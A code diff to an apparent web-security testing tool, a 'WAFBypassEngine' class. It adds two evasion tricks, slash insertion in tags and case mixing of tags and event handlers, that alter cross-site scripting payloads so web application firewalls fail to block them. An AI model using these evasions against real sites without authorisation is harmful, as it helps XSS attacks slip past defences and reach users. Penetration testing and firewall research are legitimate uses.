@@ -301,6 +301,33 @@ class WAFBypassEngine:
         expr = expr_match.group(1).strip()
         return syntax["expr"].replace("{expr}", expr)
 
+    # ─── XSS-Specific WAF Bypass Techniques ───────────────────────
+
+    def _xss_slash_tag(self, payload: str) -> str:
+        """Insert slashes in tag names to bypass WAF: <img> → <img/>"""
+        import re
+        # Add slash after tag name: <img → <img/
+        result = re.sub(r'<(\w+)', r'<\1/', payload)
+        # Also try: <img src → <img/src
+        result = re.sub(r'(\w+)\s+', r'\1/', result, count=1)
+        return result
+
+    def _xss_case_mix(self, payload: str) -> str:
+        """Mix case in event handlers and tags: onerror → OnErRoR, img → ImG"""
+        import re
+        result = payload
+        # Mix case in on* event handlers
+        event_handlers = re.findall(r'\bon\w+', result, re.IGNORECASE)
+        for handler in event_handlers:
+            mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(handler))
+            result = result.replace(handler, mixed)
+        # Mix case in tag names
+        tags = re.findall(r'<(\w+)', result)
+        for tag in tags:
+            mixed_tag = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
+            result = result.replace(f"<{tag}", f"<{mixed_tag}", 1)
+        return result
+
     # ─── Bypass Chain ──────────────────────────────────────────────
 
     async def attempt_bypass(
@@ -479,6 +506,11 @@ class WAFBypassEngine:
 
         # Whitespace manipulation
         mutations.append(("whitespace", self._whitespace_manipulate(payload), expected))
+
+        # XSS-specific WAF bypass techniques
+        if "<" in payload or ">" in payload or "alert" in payload:
+            mutations.append(("xss-slash-tag", self._xss_slash_tag(payload), expected))
+            mutations.append(("xss-case-mix", self._xss_case_mix(payload), expected))
 
         return mutations
 
